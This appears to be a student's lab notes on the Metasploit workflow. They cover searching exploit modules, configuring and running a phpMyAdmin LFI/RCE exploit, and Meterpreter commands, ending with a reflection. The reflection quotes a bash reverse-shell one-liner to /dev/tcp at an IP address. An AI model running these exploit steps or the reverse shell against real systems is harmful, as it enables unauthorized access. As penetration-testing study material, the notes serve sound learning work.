# Metasploit

## Workflow Overview
1. Find exploit (exploitdb or metasploit modules)
2. Select exploit in msfconsole
3. Set options (RHOSTS, TARGETURI, credentials)
4. Run exploit
5. Get meterpreter session
6. Get shell

## Finding Exploits

search metasploit modules by keyword
```
find /usr/share/metasploit-framework/modules/ "cgi" | grep "apache" | grep "cgi"
```

Search exploitdb by ID
```
find /usr/share/exploitdb/exploits/ | grep 50457
```

## Select Exploit in Metasploit
```
msfconsole
msf6 > use exploit/multi/http/phpmyadmin_lfi_rce
```

## Metasploit Options

view current settings
```
msf6 exploit(...) > options
```

common `set` commands
```
set RHOSTS 10.0.5.23    # target IP
set TARGETURI /cgi-bin/status # target path
set LPORT 443    # local listener port
set USERNAME gandalf
set PASSWORD shallnotpass
```

default payload is auto-assigned (eg `php/meterpreter/reverse_tcp`)

## Running Metasploit Exploit
```
msf6 exploit(...) > exploit
```

## Meterpreter Commands
```
meterpreter > getuid  # current user on target
meterpreter > sysinfo  # OS/hostname info
meterpreter > shell   # get system shell
meterpreter > upload /local/path /remote/path   # upload file to target
```

## Reflection
Metasploit definitely seems more organized than running exploits manually. You don't have to define all the variables in a long command and can instead just set them and the exploit module will format the exploit commands for you, and it even will setup your own reverse listener without you having to configure it yourself. also, you can get a shell simply by typing the `shell` command in meterpreter, which is much easier than figuring out where to run a shell like `"bash -c 'exec bash -i &>/dev/tcp/10.0.17.26/4479 <&1'""`. i think it does have it's place, however you aren't seeing the backend of how the exploits are working, which can hinder your own understanding. if an organization is up to date on security, they most likely have patched most of the metasploit exploits, since they are public CVEs. for advanced pentesting in which you need to come up with your own exploits, metasploit won't be as useful, and depending on it can create a crutch.
